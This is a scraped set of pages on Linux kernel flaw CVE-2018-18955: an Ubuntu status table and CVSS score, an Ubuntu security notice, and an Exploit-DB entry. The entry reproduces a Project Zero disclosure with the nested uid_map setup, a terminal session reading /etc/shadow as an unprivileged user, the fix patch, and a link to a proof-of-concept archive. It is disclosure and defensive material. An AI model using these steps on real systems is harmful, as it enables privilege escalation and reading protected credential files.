| 16.04 LTS xenial | Fixed 4.15.0-1035.36~16.04.1 |
| 14.04 LTS trusty | Not in release |
| linux-euclid | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not in release |
| linux-flo | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Ignored abandoned |
| 14.04 LTS trusty | Not in release |
| linux-gcp | 18.10 cosmic | Fixed 4.18.0-1004.5 |
| 18.04 LTS bionic | Fixed 4.15.0-1025.26 |
| 16.04 LTS xenial | Fixed 4.15.0-1025.26~16.04.1 |
| 14.04 LTS trusty | Not in release |
| linux-gcp-edge | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not affected |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not in release |
| linux-gke | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Ignored end of standard support |
| 14.04 LTS trusty | Not in release |
| linux-goldfish | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Ignored end of life |
| 14.04 LTS trusty | Not in release |
| linux-grouper | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not in release |
| linux-hwe | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not affected |
| 16.04 LTS xenial | Fixed 4.15.0-42.45~16.04.1 |
| 14.04 LTS trusty | Not in release |
| linux-hwe-edge | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not affected |
| 16.04 LTS xenial | Fixed 4.15.0-42.45~16.04.1 |
| 14.04 LTS trusty | Not in release |
| linux-kvm | 18.10 cosmic | Fixed 4.18.0-1005.5 |
| 18.04 LTS bionic | Fixed 4.15.0-1027.27 |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not in release |
| linux-lts-trusty | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not in release |
| linux-lts-utopic | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not in release |
| linux-lts-vivid | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not in release |
| linux-lts-wily | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not in release |
| linux-lts-xenial | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not affected |
| linux-maguro | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not in release |
| linux-mako | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Ignored abandoned |
| 14.04 LTS trusty | Not in release |
| linux-manta | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not in release |
| linux-oem | 18.10 cosmic | Fixed 4.15.0-1028.33 |
| 18.04 LTS bionic | Fixed 4.15.0-1028.33 |
| 16.04 LTS xenial | Ignored end of standard support, was needs-triage |
| 14.04 LTS trusty | Not in release |
| linux-oracle | 18.10 cosmic | Not affected |
| 18.04 LTS bionic | Not affected |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not in release |
| linux-raspi2 | 18.10 cosmic | Fixed 4.18.0-1007.9 |
| 18.04 LTS bionic | Fixed 4.15.0-1029.31 |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not in release |
| linux-snapdragon | 18.10 cosmic | Not in release |
| 18.04 LTS bionic | Not affected |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not in release |

---

* [How can I get the fixes?](/security/cves/about#security)
* [What do statuses mean?](/security/cves/about#statuses)
* [Patch details](#patch-details)

### Patch details

For informational purposes only. We recommend not to cherry-pick updates. [How can I get the fixes?](/security/cves/about#security)

| Package | Patch details |
| --- | --- |
| linux | * Introduced by   [6397fac](https://git.kernel.org/linus/6397fac4915ab3002dc15aae751455da1a852f25),   fixed by   [d2f007d](https://git.kernel.org/linus/d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd) |

## Severity score breakdown

| Parameter | Value |
| --- | --- |
| Base score | 7.0 · High |
| Attack vector | Local |
| Attack complexity | High |
| Privileges required | Low |
| User interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity impact | High |
| Availability impact | High |
| Vector | CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H |

## References

* [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18955)
* [NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-18955)
* [Launchpad](https://launchpad.net/bugs/cve/CVE-2018-18955)
* [Debian](https://security-tracker.debian.org/tracker/CVE-2018-18955)

### Related Ubuntu Security Notices (USN)

+ [USN-3835-1](https://usn.ubuntu.com/USN-3835-1)
+ Linux kernel vulnerabilities
+ 3 December 2018

+ [USN-3833-1](https://usn.ubuntu.com/USN-3833-1)
+ Linux kernel (AWS) vulnerabilities
+ 30 November 2018

+ [USN-3836-1](https://usn.ubuntu.com/USN-3836-1)
+ Linux kernel vulnerabilities
+ 3 December 2018

+ [USN-3836-2](https://usn.ubuntu.com/USN-3836-2)
+ Linux kernel (HWE) vulnerabilities
+ 4 December 2018

+ [USN-3832-1](https://usn.ubuntu.com/USN-3832-1)
+ Linux kernel (AWS) vulnerabilities
+ 30 November 2018

### Other references

* <https://www.cve.org/CVERecord?id=CVE-2018-18955>

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from usn.ubuntu.com_fabcce4c_20250124_213123.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3833-1: Linux kernel (AWS) vulnerabilities

30 November 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)

## Packages

* [linux-aws](/security/cves?package=linux-aws) - Linux kernel for Amazon Web Services (AWS) systems

## Details

Jann Horn discovered that the Linux kernel mishandles mapping UID or GID

ranges inside nested user namespaces in some situations. A local attacker

could use this to bypass access controls on resources outside the

namespace. ([CVE-2018-18955](/security/CVE-2018-18955))

Philipp Wendler discovered that the overlayfs implementation in the Linux

kernel did not properly verify the directory contents permissions from

within a unprivileged user namespace. A local attacker could use this to

expose sensitive information (protected file names). ([CVE-2018-6559](/security/CVE-2018-6559))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.04

* [linux-image-4.15.0-1029-aws](https://launchpad.net/ubuntu/%2Bsource/linux-aws)
  -
  [4.15.0-1029.30](https://launchpad.net/ubuntu/%2Bsource/linux-aws/4.15.0-1029.30)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-18955](/security/CVE-2018-18955)
* [CVE-2018-6559](/security/CVE-2018-6559)

## Related notices

* [USN-3835-1](/security/notices/USN-3835-1)
* [USN-3836-1](/security/notices/USN-3836-1)
* [USN-3836-2](/security/notices/USN-3836-2)
* [USN-3832-1](/security/notices/USN-3832-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.exploit-db.com_00e0f143_20250124_213128.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Linux - Broken uid/gid Mapping for Nested User Namespaces

#### EDB-ID:

###### 45886

#### CVE:

###### [2018-18955](https://nvd.nist.gov/vuln/detail/CVE-2018-18955)

---

**EDB Verified:**

#### Author:

###### [Google Security Research](/?author=7725)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2018-11-16

---

**Vulnerable App:**

```
commit 6397fac4915a ("userns: bump idmap limits to 340") increases the number of
possible uid/gid mappings that a namespace can have from 5 to 340. This is
implemented by switching to a different data structure if the number of mappings
exceeds 5: Instead of linear search over an unsorted array of struct
uid_gid_extent, binary search over a sorted array of struct uid_gid_extent is
used. Because ID mappings are queried in both directions (kernel ID to
namespaced ID and namespaced ID to kernel ID), two copies of the array are
created, one per direction, and they are sorted differently.

In map_write(), at first, during the loop that calls insert_extent(), the member
lower_first of each struct uid_gid_extent contains an ID in the parent
namespace. Later, map_id_range_down() is used in a loop to replace these IDs in
the parent namespace with kernel IDs.

The problem is that, when the two sorted arrays are used, the new code omits the
ID transformation for the kernel->namespaced mapping; only the
namespaced->kernel mapping is transformed appropriately.

This means that if you first, from the init namespace, create a user namespace
NS1 with the following uid_map:

    0 100000 1000

and then, from NS1, create a nested user namespace NS2 with the following
uid_map:

    0 0 1
    1 1 1
    2 2 1
    3 3 1
    4 4 1
    5 5 995

then make_kuid(NS2, ...) will work properly, but from_kuid(NS2) will be an
identity mapping for UIDs in the range 0..1000.

Most users of from_kuid() are relatively boring, but kuid_has_mapping() is used
in inode_owner_or_capable() and privileged_wrt_inode_uidgid(); so you can abuse
this to gain the ability to override DAC security controls on files whose IDs
aren't mapped in your namespace.

To test this, I installed the "uidmap" package in a Ubuntu 18.04 VM with the
following /etc/subuid and /etc/subgid:

user@ubuntu-18-04-vm:~$ cat /etc/subuid
user:100000:65536
user2:165536:65536
user3:231072:65536
user@ubuntu-18-04-vm:~$ cat /etc/subgid
user:100000:65536
user2:165536:65536
user3:231072:65536
user@ubuntu-18-04-vm:~$

Then, as the user "user", I compiled the two attached helpers (subuid_shell.c
and subshell.c):

user@ubuntu-18-04-vm:~/userns_4_15$ gcc -o subuid_shell subuid_shell.c
user@ubuntu-18-04-vm:~/userns_4_15$ gcc -o subshell subshell.c

subuid_shell.c uses the newuidmap helper to set up a namespace that maps 1000
UIDs starting at 100000 to the namespaced UID 0; subshell.c requires namespaced
CAP_SYS_ADMIN and creates a user namespace that maps UIDs 0-999, using six
extents.

I used them as follows to read /etc/shadow:

user@ubuntu-18-04-vm:~/userns_4_15$ id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
user@ubuntu-18-04-vm:~/userns_4_15$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1519 Jul  4 16:11 /etc/shadow
user@ubuntu-18-04-vm:~/userns_4_15$ head -n1 /etc/shadow
head: cannot open '/etc/shadow' for reading: Permission denied
user@ubuntu-18-04-vm:~/userns_4_15$ ./subuid_shell
root@ubuntu-18-04-vm:~/userns_4_15# id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
root@ubuntu-18-04-vm:~/userns_4_15# cat /proc/self/uid_map
         0     100000       1000
root@ubuntu-18-04-vm:~/userns_4_15# ls -l /etc/shadow
-rw-r----- 1 nobody nogroup 1519 Jul  4 16:11 /etc/shadow
root@ubuntu-18-04-vm:~/userns_4_15# head -n1 /etc/shadow
head: cannot open '/etc/shadow' for reading: Permission denied
root@ubuntu-18-04-vm:~/userns_4_15# ./subshell
nobody@ubuntu-18-04-vm:~/userns_4_15$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
nobody@ubuntu-18-04-vm:~/userns_4_15$ cat /proc/self/uid_map
         0          0          1
         1          1          1
         2          2          1
         3          3          1
         4          4          1
         5          5        995
nobody@ubuntu-18-04-vm:~/userns_4_15$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1519 Jul  4 16:11 /etc/shadow
nobody@ubuntu-18-04-vm:~/userns_4_15$ head -n1 /etc/shadow
root:!:17696:0:99999:7:::
nobody@ubuntu-18-04-vm:~/userns_4_15$

Here is a suggested patch (copy attached to avoid whitespace issues); does this
look sensible?

==================
From 20598025d5e80f26a0c4306ebeca14b31539bd97 Mon Sep 17 00:00:00 2001
From: Jann Horn <jannh@google.com>
Date: Mon, 5 Nov 2018 20:55:09 +0100
Subject: [PATCH] userns: also map extents in the reverse map to kernel IDs

The current logic first clones the extent array and sorts both copies, then
maps the lower IDs of the forward mapping into the lower namespace, but
doesn't map the lower IDs of the reverse mapping.

This means that code in a nested user namespace with >5 extents will see
incorrect IDs. It also breaks some access checks, like
inode_owner_or_capable() and privileged_wrt_inode_uidgid(), so a process
can incorrectly appear to be capable relative to an inode.

To fix it, we have to make sure that the "lower_first" members of extents
in both arrays are translated; and we have to make sure that the reverse
map is sorted *after* the translation (since otherwise the translation can
break the sorting).

This is CVE-2018-18955.

Fixes: 6397fac4915a ("userns: bump idmap limits to 340")
Cc: stable@vger.kernel.org
Signed-off-by: Jann Horn <jannh@google.com>
---
 kernel/user_namespace.c | 12 ++++++++----
 1 file changed, 8 insertions(+), 4 deletions(-)

diff --git a/kernel/user_namespace.c b/kernel/user_namespace.c
index e5222b5fb4fe..923414a246e9 100644
--- a/kernel/user_namespace.c
+++ b/kernel/user_namespace.c
@@ -974,10 +974,6 @@ static ssize_t map_write(struct file *file, const char __user *buf,
        if (!new_idmap_permitted(file, ns, cap_setid, &new_map))
                goto out;

-       ret = sort_idmaps(&new_map);
-       if (ret < 0)
-               goto out;
-
        ret = -EPERM;
        /* Map the lower ids from the parent user namespace to the
         * kernel global id space.
@@ -1004,6 +1000,14 @@ static ssize_t map_write(struct file *file, const char __user *buf,
                e->lower_first = lower_first;
        }

+       /*
+        * If we want to use binary search for lookup, this clones the extent
+        * array and sorts both copies.
+        */
+       ret = sort_idmaps(&new_map);
+       if (ret < 0)
+               goto out;
+
        /* Install the map */
        if (new_map.nr_extents <= UID_GID_MAP_MAX_BASE_EXTENTS) {
                memcpy(map->extent, new_map.extent,
--
2.19.1.930.g4563a0d9d0-goog
==================

(By the way: map_id_up_max() is probably pretty inefficient, especially when
retpoline mitigations are on, because it uses bsearch(), which is basically a
little bit of logic glue around indirect function calls. If you care about
speed, you might want to add an inline variant of bsearch() for places like
this.)

Proof of Concept:
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip

```

**Tags:**
[Local](/?tag=22)

**Advisory/Source:**
[Link](https://bugs.chromium.org/p/project-zero/issues/detail?id=1712)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
